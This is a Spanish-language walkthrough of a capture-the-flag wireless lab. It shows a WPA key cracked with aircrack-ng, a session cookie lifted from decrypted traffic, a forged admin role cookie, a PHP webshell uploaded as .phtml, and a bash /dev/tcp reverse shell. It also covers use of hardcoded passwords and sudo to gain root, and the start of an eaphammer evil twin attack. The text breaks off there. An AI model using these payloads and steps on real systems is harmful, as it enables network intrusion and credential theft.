-rw-r--r-- 1 root root 253952 Apr 12 01:56 /tmp/airtouch_capture-01.log.csv
```

El *.cap* archivo tiene un tamaño de varios KB, lo que significa que contiene más que encabezados vacíos.

## Grieta

Enviaré *scp* la captura de vuelta a mi anfitrión:

```bash
jorge@hacky$ sshpass -p RxBlZhLmOkacNWScmZ6D scp consultant@10.129.244.98:/tmp/airtouch_capture-01.cap .

```

Y úselo `aircrack-ngcon` *rockyou.txt* para descifrar la PSK:


```bash
jorge@hacky$ aircrack-ng -w /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  ./airtouch_capture-01.cap
Reading packets, please wait...
Opening ./airtouch_capture-01.cap
Read 1349 packets.

   #  BSSID              ESSID                     Encryption

   1  F0:9F:C2:A3:F1:A7  AirTouch-Internet         WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening ./airtouch_capture-01.cap
Read 1349 packets.

1 potential targets

                               Aircrack-ng 1.7

      [00:00:01] 21658/10303727 keys tested (35960.70 k/s)

      Time left: 4 minutes, 45 seconds                           0.21%

                           KEY FOUND! [ challenge ]


      Master Key     : D1 FF 70 2D CB 11 82 EE C9 E1 89 E1 69 35 55 A0
                       07 DC 1B 21 BE 35 8E 02 B8 75 74 49 7D CF 01 7E

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

      EAPOL HMAC     : 7F 7F E6 5F 60 0B 9C 6B D8 C4 B8 86 AC 2F 88 F4

```

La contraseña para AirTouch-Internet es “challenge”.

## Conectar

Con la contraseña y las interfaces inalámbricas, me conectaré a *AirTouch-Internet.* `wpa_passphrase` Se creará la configuración:

```bash
root@AirTouch-Consultant:~# wpa_passphrase AirTouch-Internet 'challenge' > /tmp/airtouch-internet.conf
root@AirTouch-Consultant:~# cat /tmp/airtouch-internet.conf
network={
        ssid="AirTouch-Internet"
        #psk="challenge"
        psk=d1ff702dcb1182eec9e189e1693555a007dc1b21be358e02b87574497dcf017e
}
```

Entonces wpa_supplicantse conectará:

```bash
root@AirTouch-Consultant:~# wpa_supplicant -B -i wlan2 -c /tmp/airtouch-internet.conf
Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information
```


Lo estoy usando *wlan2* porque está limpio, aún no lo he modificado. Esto muestra la interfaz, pero todavía no tiene una dirección IP:

```bash
root@AirTouch-Consultant:~# ip addr show wlan2
9: wlan2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::ff:fe00:200/64 scope link 
       valid_lft forever preferred_lft forever
```

*dhclient* iniciará el proceso `DHCP` para obtener uno:

```bash
root@AirTouch-Consultant:~# dhclient -v wlan2
Internet Systems Consortium DHCP Client 4.4.1
Copyright 2004-2018 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/



Listening on LPF/wlan2/02:00:00:00:02:00
Sending on   LPF/wlan2/02:00:00:00:02:00
Sending on   Socket/fallback
DHCPDISCOVER on wlan2 to 255.255.255.255 port 67 interval 3 (xid=0xadc90477)
DHCPOFFER of 192.168.3.84 from 192.168.3.1
DHCPREQUEST for 192.168.3.84 on wlan2 to 255.255.255.255 port 67 (xid=0x7704c9ad)
DHCPACK of 192.168.3.84 from 192.168.3.1 (xid=0xadc90477)
bound to 192.168.3.84 -- renewal in 36119 seconds.
root@AirTouch-Consultant:~# ip addr show wlan2
9: wlan2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.3.84/24 brd 192.168.3.255 scope global dynamic wlan2
       valid_lft 86165sec preferred_lft 86165sec
    inet6 fe80::ff:fe00:200/64 scope link 
       valid_lft forever preferred_lft forever
```

Tengo una dirección IP en `AirTouch-Internet` de *192.168.3.84,* que está dentro del rango esperado según el diagrama. Tras un reinicio, es probable que esta IP sea diferente, pero estará en la misma subred.

# Shell como www-data@AirTouch-AP-PSK

Enumeración de red

Lamentablemente, *ping* no está instalado en el portátil del consultor, pero `nmap` sí lo está. Lo ejecutaré con los puertos superiores predeterminados en toda la red de clase C:

```bash
root@AirTouch-Consultant:~# nmap 192.168.3.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-12 11:44 UTC
Nmap scan report for 192.168.3.1
Host is up (0.000038s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
MAC Address: F0:9F:C2:A3:F1:A7 (Ubiquiti Networks)

Nmap scan report for 192.168.3.84
Host is up (0.000010s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 256 IP addresses (2 hosts up) scanned in 26.27 seconds
```

Obtendré un escaneo más completo en 192.168.3.1:

```bash
root@AirTouch-Consultant:~# nmap -p- --min-rate 10000 192.168.3.1
Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-12 11:53 UTC
Nmap scan report for 192.168.3.1
Host is up (0.000015s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
MAC Address: F0:9F:C2:A3:F1:A7 (Ubiquiti Networks)

Nmap done: 1 IP address (1 host up) scanned in 14.44 seconds
root@AirTouch-Consultant:~# nmap -p 22,53,80 -sCV 192.168.3.1
Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-12 11:54 UTC
Nmap scan report for 192.168.3.1
Host is up (0.00015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  dnsmasq 2.90
| dns-nsid: 
|_  bind.version: dnsmasq-2.90
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: WiFi Router Configuration
|_Requested resource was login.php
MAC Address: F0:9F:C2:A3:F1:A7 (Ubiquiti Networks)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.25 seconds
```

Voy a establecer un túnel hacia esta máquina reconectándome *ssh* con -D 1080. Me gusta configurar Burp para que mi navegador envíe a través de Burp y luego Burp a través del proxy *SSH*:

![Captura de pantalla de la web](assets/images/AirTouch/imagen4.webp)

Simplemente quiero reiniciar esto cuando termine.

# Enrutador PSK - TCP 80
## Sitio

El sitio web en el puerto 80 redirige a `/login.php,` que presenta un formulario de inicio de sesión:


![Captura de pantalla de la web](assets/images/AirTouch/imagen5.webp)

Supongo que cualquier credencial devuelve un error:

![Captura de pantalla de la web](assets/images/AirTouch/imagen6.webp)


# Pila tecnológica

Los encabezados de respuesta HTTP muestran que la página está alojada en Apache:

```bash
HTTP/1.1 302 Found
Date: Sun, 12 Apr 2026 12:18:45 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
location: login.php
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

La página 404 es la página 404 predeterminada de Apache :

![Captura de pantalla de la web](assets/images/AirTouch/imagen7.webp)

Es evidente que el sitio está basado en *PHP*, a juzgar por la extensión del archivo.

## Fuerza bruta en directorios

Voy a usar `feroxbuster` la --proxy opción de fuerza bruta para acceder a las rutas en este servidor web:

```bash
jorge@hacky$ feroxbuster -u http://192.168.3.1 -x php --proxy socks5://127.0.0.1:1080

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.3.1
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💎  Proxy                 │ socks5://127.0.0.1:1080
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://192.168.3.1/ => login.php
301      GET        9l       28w      312c http://192.168.3.1/uploads => http://192.168.3.1/uploads/
302      GET        0l        0w        0c http://192.168.3.1/index.php => login.php
200      GET       87l      161w     1325c http://192.168.3.1/style.css
200      GET       40l       67w      907c http://192.168.3.1/login.php
302      GET        0l        0w        0c http://192.168.3.1/lab.php => login.php
[####################] - 62s    60003/60003   0s      found:6       errors:1      
[####################] - 59s    30000/30000   505/s   http://192.168.3.1/ 
[####################] - 59s    30000/30000   505/s   http://192.168.3.1/uploads/

```

*/uploads* Es interesante. La redirección 301 /uploads/ es el comportamiento normal de un directorio, pero al acceder a la ruta con barra diagonal final se obtiene un error 403 Prohibido: la lista de directorios está deshabilitada. Los archivos que contiene aún podrían ser accesibles si conozco sus nombres.

# Recuperar cookie de sesión

## Introduzca PSK

Pude recuperar la clave precompartida *(PSK)* para el cifrado WPA2 en la captura anterior. Puedo usarla para analizar el tráfico de la red en WireShark. La clave debe introducirse en Editar -> Preferencias -> Protocolos -> IEEE 802.11.

![Captura de pantalla de la web](assets/images/AirTouch/imagen8.webp)

El botón “Editar…” de las claves de descifrado carga un cuadro de diálogo:

![Captura de pantalla de la web](assets/images/AirTouch/imagen9.webp)

# Sesión HTTP

Si filtro en WireShark para *http*, aparecen dos paquetes:


![Captura de pantalla de la web](assets/images/AirTouch/imagen10.webp)

Es una solicitud GET para `/lab.php` y la respuesta. Seguiré el flujo TCP:

![Captura de pantalla de la web](assets/images/AirTouch/imagen11.webp)

Existe una cookie de sesión además de una *UserRole* cookie.

# Acceso al sitio web

## Usuario

Actualizaré mi `PHPSESSID` cookie en las herramientas para desarrolladores de Firefox:

![Captura de pantalla de la web](assets/images/AirTouch/imagen12.webp)

Ahora, al cargar, / no redirige a /login.php:

![Captura de pantalla de la web](assets/images/AirTouch/imagen13.webp)

Observo que la página se ve un poco rara. No hay texto dentro de los paréntesis “()”, y hay un div vacío en la parte inferior. Si agrego la `UserRole` cookie:

![Captura de pantalla de la web](assets/images/AirTouch/imagen14.webp)

La parte superior está modificada:

![Captura de pantalla de la web](assets/images/AirTouch/imagen15.webp)

Puedo configurarlo como quiera, y eso se refleja en la página:

![Captura de pantalla de la web](assets/images/AirTouch/imagen16.webp)

La aplicación de roles en este caso se realiza completamente del lado del cliente. El servidor confía en cualquier *UserRole* valor que envíe el navegador sin validarlo con respecto a la sesión, por lo que cualquier funcionalidad privilegiada que dependa únicamente de esta cookie es accesible simplemente modificándola.

## Acceso de administrador

Cuando cambio el *UserRole* valor a "admin", no solo se actualiza el mensaje de bienvenida, sino que ahora hay una función de carga en el div inferior:

![Captura de pantalla de la web](assets/images/AirTouch/imagen17.webp)

Voy a crear un `.json` archivo simple:

```json
{ "test": "hello" }
```
Al subirlo, apunta al `/uploads/` directorio:

![Captura de pantalla de la web](assets/images/AirTouch/imagen18.webp)

Todavía no puedo acceder /uploads/, pero puedo acceder /uploads/test.json(usando proxychainspara usar el proxy SSH):

```bash
jorge@hacky$ proxychains curl http://192.168.3.1/uploads/test.json
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.3.1:80  ...  OK
{ "test": "hello" }
```

# Caparazón

## Webshell

Voy a crear una interfaz web PHP sencilla *jorge.php:*

```bash
<?php

system($_REQUEST['cmd']);

?>
```

Al intentar subirlo, el sitio lo rechaza:

![Captura de pantalla de la web](assets/images/AirTouch/imagen19.webp)

Hay otras extensiones de archivo que normalmente se manejan como PHP . .php3, .php4, y .php5 todas están bloqueadas, pero .phtml funciona:

![Captura de pantalla de la web](assets/images/AirTouch/imagen20.webp)

Y funciona:

```bash
jorge@hacky$ proxychains curl http://192.168.3.1/uploads/jorge.phtml -d 'cmd=id'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.3.1:80  ...  OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Carcasa inversa

No puedo obtener ningún tipo de tráfico desde `192.168.3.1` hacia mi host. Ni HTTP, ni ping, ni shell inversa. Pero, cuando empiezo a *nc* escuchar en la máquina del consultor, puedo obtener una shell inversa allí:

```bash
jorge@hacky$ proxychains curl http://192.168.3.1/uploads/jorge.phtml --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/192.168.3.84/443 0>&1"'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.3.1:80  ...  OK
```
Eso simplemente se queda colgado, pero en *nc*:

```bash
root@AirTouch-Consultant:~# nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 192.168.3.1 40112
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@AirTouch-AP-PSK:/var/www/html/uploads$
```
Actualizaré mi shell usando el truco estándar :

```bash
www-data@AirTouch-AP-PSK:/var/www/html/uploads$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null 
www-data@AirTouch-AP-PSK:/var/www/html/uploads$ ^Z
[1]+  Stopped                 nc -lnvp 443
root@AirTouch-Consultant:~# stty raw -echo ; fg
nc -lnvp 443
            ‍reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@AirTouch-AP-PSK:/var/www/html/uploads$

```

# Shell como root@AirTouch-AP-PSK
## Enumeración
## Sitio web

El sitio web PHP se encuentra en `/var/www/html`

```bash
www-data@AirTouch-AP-PSK:/var/www/html$ ls
index.php  lab.php  login.php  logout.phtml  style.css  uploads
``` 

*login.php* tiene credenciales codificadas:

```bash
  /* Define username, associated password, and user attribute array */
  $logins = array(
    /*'user' => array('password' => 'JunDRDZKHDnpkpDDvay', 'role' => 'admin'),*/
    'manager' => array('password' => '2wLFYNh4TSTgA5sNgT4', 'role' => 'user')
  );
```

El usuario está comentado. Luego verifica la entrada y establece la *UserRole* cookie:

```bash
  /* Check and assign submitted Username and Password to new variable */
  $Username = isset($_POST['Username']) ? $_POST['Username'] : '';                                                                     
  $Password = isset($_POST['Password']) ? $_POST['Password'] : '';
                                 
  /* Check Username and Password existence in defined array */
  if (isset($logins[$Username]) && $logins[$Username]['password'] === $Password) {
    /* Success: Set session variables and redirect to Protected page  */
    $_SESSION['UserData']['Username'] = $logins[$Username]['password'];
    /* Success: Set session variables USERNAME  */
    $_SESSION['Username'] = $Username;

    // Set a cookie with the user's role
    setcookie('UserRole', $logins[$Username]['role'], time() + (86400 * 30), "/"); // 86400 = 1 day

    header("location:index.php"); 
    exit;
  } else {
    /*Unsuccessful attempt: Set error message */
    $msg = "<span style='color:red'>Invalid Login Details</span>";
  }
}

?>
```

Está `PHPSESSID` gestionado por PHP, y los valores almacenados *$_SESSION* reflejan eso.

## Usuarios

Hay un usuario en /home:

```bash
www-data@AirTouch-AP-PSK:/home$ ls
user
```

Esto coincide con los usuarios con shells configurados en passwd:

```bash
www-data@AirTouch-AP-PSK:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000::/home/user:/bin/bash
```
*www-data* no puede leer nada de ese directorio.

Intentar ejecutar `sudo -l` solicitudes con una contraseña que no tengo.

## su / SSH como usuario

El código *PHP* comentado tiene una contraseña para el usuario usuario, así que lo probaré en el sistema con su, y funciona:

```bash
www-data@AirTouch-AP-PSK:/$ su user -
Password: 
user@AirTouch-AP-PSK:/$
```

También funciona a través de SSH usando `proxychains` (o desde la consola del consultor):

```bash
jorge@hacky$ proxychains sshpass -p JunDRDZKHDnpkpDDvay ssh user@192.168.3.1
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.3.1:22  ...  OK
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
...[snip]...
user@AirTouch-AP-PSK:~$
```

## sudo

El usuario puede ejecutar cualquier comando como cualquier usuario sin contraseña utilizando sudo:

```bash
user@AirTouch-AP-PSK:~$ sudo -l
Matching Defaults entries for user on AirTouch-AP-PSK:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on AirTouch-AP-PSK:
    (ALL) NOPASSWD: ALL
```

*sudo -i* Devuelve una consola de root:

```bash
user@AirTouch-AP-PSK:~$ sudo -i
root@AirTouch-AP-PSK:~# 
```

Voy a coger *user.txt*:

```bash
root@AirTouch-AP-PSK:~# cat user.txt
9fd9619b************************
```

# Shell como remoto@AirTouch-AP-MGT
## Enumeración
## Directorios de inicio


*/root* tiene un montón de cosas:

```bash
root@AirTouch-AP-PSK:~# ls -la
total 44
drwx------ 1 root root 4096 Apr 10 19:04 .
drwxr-xr-x 1 root root 4096 Apr 10 19:04 ..
lrwxrwxrwx 1 root root    9 Nov 24  2024 .bash_history -> /dev/null
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
drwxr-xr-x 2 root root 4096 Mar 27  2024 certs-backup
-rwxr-xr-x 1 root root    0 Mar 27  2024 cronAPs.sh
drwxr-xr-x 1 root root 4096 Apr 10 19:04 psk
-rw-r--r-- 1 root root  364 Nov 24  2024 send_certs.sh
-rwxr-xr-x 1 root root 1963 Mar 27  2024 start.sh
-rw-r----- 1 root 1001   33 Apr 10 19:04 user.txt
-rw-r--r-- 1 root root  319 Mar 27  2024 wlan_config_aps
```

*start.sh*

```bash
#!/bin/bash

echo start.sh

# TODO move to Dockerfile
envsubst_tmp (){
    for F in ./*.tmp ; do
        #DO it only first time
        if [ "$F" != '/*.tmp' ]; then
            #echo $F
            NEW=`basename $F .tmp`
            envsubst < $F > $NEW
            rm $F 2> /dev/nil
        fi
    done
}

chown user:user /home/user/user.txt
chmod +r /var/www/certs/ -R

#LOAD VARIABLES FROM FILE (EXPORT)
set -a
source /root/wlan_config_aps

envsubst < /etc/dnsmasq.conf.tmp > /etc/dnsmasq.conf

# Replace var in config AP files
#PSK
cd /root/psk/
envsubst_tmp

cd

date

echo 'nameserver 8.8.8.8' > /etc/resolv.conf

# Wlan first 6 for attacker, next 14 for AP, rest for client

mkdir /var/log/ 2> /dev/nil

#F0:9F:C2:71 ubiquiti
macchanger -m $MAC_PSK $WLAN_PSK >> /var/log/macchanger.log # PSK

macchanger -r $WLAN_OTHER0  >> /var/log/macchanger.log # Other 0
macchanger -r $WLAN_OTHER1 >> /var/log/macchanger.log # Other 1
macchanger -r $WLAN_OTHER2 >> /var/log/macchanger.log # Other 2
macchanger -r $WLAN_OTHER3 >> /var/log/macchanger.log # Other 3


bash /root/cronAPs.sh > /var/log/cronAPs.log 2>&1 &

dnsmasq

#TODO RE ORDER ALL WLAN and IP -> 0 OPN, 1 WEP, 2 PSK, 3 PSK WPS, 4 MGT, 5 MGTRelay, 6 MGT TLS, 7 8 , 9,10,11,12,13 others

# PSK
ip addr add $IP_PSK.1/24 dev $WLAN_PSK
hostapd_aps /root/psk/hostapd_wpa.conf > /var/log/hostapd_wpa.log &

#TODO
#ip addr add $IP_8.1/24 dev $WLAN_MGTTLS

# PSK Other
ip addr add $IP_OTHER0.1/24 dev $WLAN_OTHER0
hostapd_aps /root/psk/hostapd_other0.conf > /var/log/hostapd_other0.log &

ip addr add $IP_OTHER1.1/24 dev $WLAN_OTHER1
hostapd_aps /root/psk/hostapd_other1.conf > /var/log/hostapd_other1.log &

ip addr add $IP_OTHER2.1/24 dev $WLAN_OTHER2
hostapd_aps /root/psk/hostapd_other2.conf > /var/log/hostapd_other2.log &

ip addr add $IP_OTHER3.1/24 dev $WLAN_OTHER3
hostapd_aps /root/psk/hostapd_other3.conf > /var/log/hostapd_other3.log &

#systemctl stop networking
echo "ALL SET"

/bin/bash
```

Este script es responsable de:

- Lanzamiento de *AirTouch-Internet*, así como de los puntos de acceso que quedan fuera del alcance del proyecto.

- Se utiliza macchangerpara configurar las direcciones MAC de los AP. *AirTouch-Internet* se configura con la MAC específica de Ubiquiti y el resto se generan aleatoriamente mediante *-r*.

*send_certs.sh* copia los archivos de */root/certs-backup* a 10.10.10.1 usando scp:

```bash
#!/bin/bash

# DO NOT COPY
# Script to sync certs-backup folder to AirTouch-office. 

# Define variables
REMOTE_USER="remote"
REMOTE_PASSWORD="xGgWEwqUpfoOVsLeROeG"
REMOTE_PATH="~/certs-backup/"
LOCAL_FOLDER="/root/certs-backup/"

# Use sshpass to send the folder via SCP
sshpass -p "$REMOTE_PASSWORD" scp -r "$LOCAL_FOLDER" "$REMOTE_USER@10.10.10.1:$REMOTE_PATH"
```
*10.10.10.1* es la puerta de enlace de `AirTouch-Office`, y tiene el usuario remoto con la contraseña “xGgWEwqUpfoOVsLeROeG”. Desafortunadamente, este dispositivo no tiene una interfaz en la red 10.10.10.0/24, por lo que la conexión SSH falla:

```bash
root@AirTouch-AP-PSK:~# ssh remote@10.10.10.1
ssh: connect to host 10.10.10.1 port 22: Network is unreachable
root@AirTouch-AP-PSK:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
14: wlan7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether f0:9f:c2:a3:f1:a7 brd ff:ff:ff:ff:ff:ff
    inet 192.168.3.1/24 scope global wlan7
       valid_lft forever preferred_lft forever
    inet6 fe80::f29f:c2ff:fea3:f1a7/64 scope link 
       valid_lft forever preferred_lft forever
15: wlan8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 3e:16:e6:e4:3c:72 brd ff:ff:ff:ff:ff:ff
    inet 192.168.4.1/24 scope global wlan8
       valid_lft forever preferred_lft forever
    inet6 fe80::3c16:e6ff:fee4:3c72/64 scope link 
       valid_lft forever preferred_lft forever
16: wlan9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 92:52:98:67:66:19 brd ff:ff:ff:ff:ff:ff
    inet 192.168.5.1/24 scope global wlan9
       valid_lft forever preferred_lft forever
    inet6 fe80::9052:98ff:fe67:6619/64 scope link 
       valid_lft forever preferred_lft forever
17: wlan10: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 8a:68:3a:d6:eb:29 brd ff:ff:ff:ff:ff:ff
    inet 192.168.6.1/24 scope global wlan10
       valid_lft forever preferred_lft forever
    inet6 fe80::8868:3aff:fed6:eb29/64 scope link 
       valid_lft forever preferred_lft forever
18: wlan11: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether f2:2a:26:a4:0b:29 brd ff:ff:ff:ff:ff:ff
    inet 192.168.7.1/24 scope global wlan11
       valid_lft forever preferred_lft forever
    inet6 fe80::f02a:26ff:fea4:b29/64 scope link 
       valid_lft forever preferred_lft forever
```

*certs-backup* Tiene los certificados de CA y de servidor:

```bash
root@AirTouch-AP-PSK:~# ls certs-backup/
ca.conf  ca.crt  server.conf  server.crt  server.csr  server.ext  server.key
```


*ca.key* Falta. Con eso, podría firmar mi propio certificado de cliente y autenticarme en el punto de acceso.

# Recuperar contraseña con Evil Twin
## Estrategia

Con el certificado de la CA ( ) y el certificado y la clave *ca.crt* del servidor ( ), puedo crear una réplica maliciosa de *AirTouch-Office* con apariencia legítima y capturar el flujo de autenticación. Sin este material criptográfico, el cliente no podrá avanzar lo suficiente en la conexión como para revelar nada *server.crt* 

En este momento, desconozco la configuración exacta de la red y cómo gestiona la autenticación. Algunos posibles algoritmos:

- *EAP-TLS*: La autenticación mutua requiere que el cliente posea su propio certificado y clave privada. El cliente presenta su certificado (que puede ser interceptado), pero demuestra la posesión de la clave privada sin enviarla. Por lo tanto, el ataque "malvado" revela las identidades del cliente y las cadenas de certificados, pero sin la clave privada no se puede usar ese certificado para autenticarse, lo que deja al ataque con un valor meramente de reconocimiento.

- *PEAP-MSCHAPv2 o EAP-TTLS-MSCHAPv2*: En estos casos, el cliente envía un desafío/respuesta dentro del túnel TLS que se puede extraer y descifrar sin conexión para recuperar la contraseña de un usuario.

- *PEAP-GTC / TTLS-PAP*: En este caso, la contraseña del usuario en texto plano se envía a través de un túnel TLS.
Si se utiliza alguno de estos últimos métodos, puedo obtener material de autenticación. Podría monitorizar el canal AirTouch-Office para identificar el algoritmo, pero es igual de rápido realizar el ataque Evil Twin y ver qué resultados se obtienen.

## Recopilar datos

Para iniciar el ataque, necesitaré algunos datos. Copiaré la información del certificado de `AirTouch-AP-PSK` al equipo del consultor:

```bash
root@AirTouch-AP-PSK:~# scp certs-backup/* consultant@192.168.3.84:~/
The authenticity of host '192.168.3.84 (192.168.3.84)' can't be established.
ECDSA key fingerprint is SHA256:RNSulmHvYvAQ2qGrTB9aiv48odVoupHVDFEeI6PS4j0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.3.84' (ECDSA) to the list of known hosts.
consultant@192.168.3.84's password: 
ca.conf                                        100% 1124   229.7KB/s   00:00    
ca.crt                                         100% 1712     1.8MB/s   00:00    
server.conf                                    100% 1111   563.3KB/s   00:00    
server.crt                                     100% 1493     1.6MB/s   00:00    
server.csr                                     100% 1033   712.4KB/s   00:00    
server.ext                                     100%  168   131.5KB/s   00:00    
server.key                                     100% 1704     2.8MB/s   00:00 

```

Los importaré *eaphammer* usando la --cert-wizar dopción:

```bash
root@AirTouch-Consultant:~/eaphammer# ./eaphammer --cert-wizard import --server-cert /home/consultant/server.crt --ca-cert /home/consultant/ca.crt --private-key /home/consultant/server.key 

                     .__                                         
  ____ _____  ______ |  |__ _____    _____   _____   ___________ 
_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \
\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
 \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|   
     \/     \/|__|        \/     \/      \/      \/     \/       


                        Now with more fast travel than a next-gen Bethesda game. >:D

                             Version:  1.14.0
                            Codename:  Final Frontier
                              Author:  @s0lst1c3
                             Contact:  gabriel<<at>>transmitengage.com

    
[?] Am I root?
[*] Checking for rootness...
[*] I AM ROOOOOOOOOOOOT
[*] Root privs confirmed! 8D
Case 1: Import all separate
[CW] Ensuring server cert, CA cert, and private key are valid...
/home/consultant/server.crt
/home/consultant/server.key
/home/consultant/ca.crt
[CW] Complete!
[CW] Loading private key from /home/consultant/server.key
[CW] Complete!
[CW] Loading server cert from /home/consultant/server.crt
[CW] Complete!
[CW] Loading CA certificate chain from /home/consultant/ca.crt
[CW] Complete!
[CW] Constructing full certificate chain with integrated key...
[CW] Complete!
[CW] Writing private key and full certificate chain to file...
[CW] Complete!
[CW] Private key and full certificate chain written to: /root/eaphammer/certs/server/AirTouch CA.pem
[CW] Activating full certificate chain...
[CW] Complete!
```

También necesitaré conocer el canal y las direcciones MAC de los *AirTouch-Office* puntos de acceso, que recopilé anteriormente:

```bash
root@AirTouch-Consultant:/# iwlist wlan0 scan | grep -e ESSID -e Frequency -e Address
...[snip]...
          Cell 06 - Address: AC:8B:A9:AA:3F:D2
                    Frequency:5.22 GHz (Channel 44)
                    ESSID:"AirTouch-Office"
          Cell 07 - Address: AC:8B:A9:F3:A1:13
                    Frequency:5.22 GHz (Channel 44)
                    ESSID:"AirTouch-Office"
```

Ambos están en el canal 44 y tienen dos direcciones MAC distintas.

## Capturar desafío respuesta

Comenzaré *eaphammer* con una interfaz que no se ha utilizado previamente, suplantando la identidad de AirTouch-Office:

```bash
root@AirTouch-Consultant:~/eaphammer# ./eaphammer -i wlan4 --auth wpa-eap --essid AirTouch-Office

                     .__
  ____ _____  ______ |  |__ _____    _____   _____   ___________
_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \
